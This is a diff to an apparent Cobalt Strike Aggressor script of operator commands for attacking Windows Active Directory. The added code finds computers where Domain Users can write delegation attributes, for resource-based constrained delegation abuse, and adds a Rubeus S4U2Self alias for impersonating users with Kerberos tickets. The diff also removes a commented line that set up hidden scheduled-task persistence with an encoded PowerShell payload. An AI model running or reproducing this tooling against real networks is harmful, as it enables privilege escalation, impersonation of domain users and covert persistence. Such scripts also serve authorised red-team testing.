@@ -325,9 +325,27 @@ beacon_command_register(
 );
 
 #ROLE BASED CONSTRAINED DELEGATION
-#FINDING TARGETS
+#FINDING TARGETS.
+sub kerberos_rbcd_findtargets_cb {
+    local('$regex $sid $command');
+    blog($1,$2);
+
+    $regex = '(.*)-513';
+    $sid = matches($2, $regex)[0];
+
+    blog($1, "Targetting SID: " . $sid);
+
+    $command = 'Get-DomainComputer |'
+    . 'Get-DomainObjectAcl -ResolveGUIDs |'
+    . '? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "'
+    . $sid
+    . '-[\d]{4,10}" }';
+
+    bpowerpick($1,$command);
+}
 alias kerberos_rbcd_findtargets {
-    bpowerpick($1, 'Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }');
+    $command = 'Convert-NameToSid "Domain Users"';
+    bpowerpick($1, $command, $null, $null, &kerberos_rbcd_findtargets_cb)
 }
 beacon_command_register(
     "kerberos_rbcd_findtargets",
@@ -336,7 +354,6 @@ beacon_command_register(
 
 #PERSISTANCE METHODS
 ## SCHEDULED TASKS
-#execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc <base64>" -n "Updater" -m add -o hourly
 alias persist_schtask {
     $rand = rand_alphanum(4);
 
@@ -1233,12 +1250,13 @@ beacon_command_register(
 
 alias kerberos_s4u {
     $size = size(@_);
+    $parameters = "s4u /nowrap";
     if( $size == 5 ) {
         $impuser    = @_[1];
         $delspn     = @_[2];
         $user       = @_[3];
         $ticket     = @_[4];
-        $parameters = "s4u /nowrap"
+        $parameters = $parameters
         . " /impersonateuser:" . $impuser
         . " /msdsspn:" . $delspn
         . " /user:" . $user
@@ -1249,7 +1267,7 @@ alias kerberos_s4u {
         $altspn     = @_[3];
         $user       = @_[4];
         $ticket     = @_[5];
-        $parameters = "s4u /nowrap"
+        $parameters = $parameters
         . " /impersonateuser:" . $impuser
         . " /msdsspn:" . $delspn
         . " /altservice:" . $altspn
@@ -1271,4 +1289,34 @@ beacon_command_register(
     . "Examples:\n"
     . "[delegatable spn] - cifs/host.domain.tld\n"
     . "[alt spn] - ldap\n"
+)
+
+alias kerberos_s4uself {
+    $size = size(@_);
+    $parameters = "s4u /nowrap /self";
+    if( $size == 5 ) {
+        $impuser    = @_[1];
+        $altspn     = @_[2];
+        $user       = @_[3];
+        $ticket     = @_[4];
+
+        $parameters = $parameters
+        . " /impersonateuser:" . $impuser
+        . " /altservice:" . $altspn
+        . " /user:" . $user
+        . " /ticket:" . $ticket;
+    } else {
+        berror($1, "Invalid Parameters!");
+        return;
+    }
+
+    bexecute_assembly($1, $RUBEUS_PATH, $parameters);
+}
+beacon_command_register(
+    "kerberos_s4uself",
+    "Use Rubeus to perform S4U2Self delegation",
+    "Use Rubeus to perform S4U2Self delegation\n\n"
+    . "Usage: kerberos_s4uself [impersonated user] [altservice spn] [ticket user] [ticket]\n\n"
+    . "Examples:\n"
+    . "[altservice spn] - cifs/host.domain.tld\n"
 )
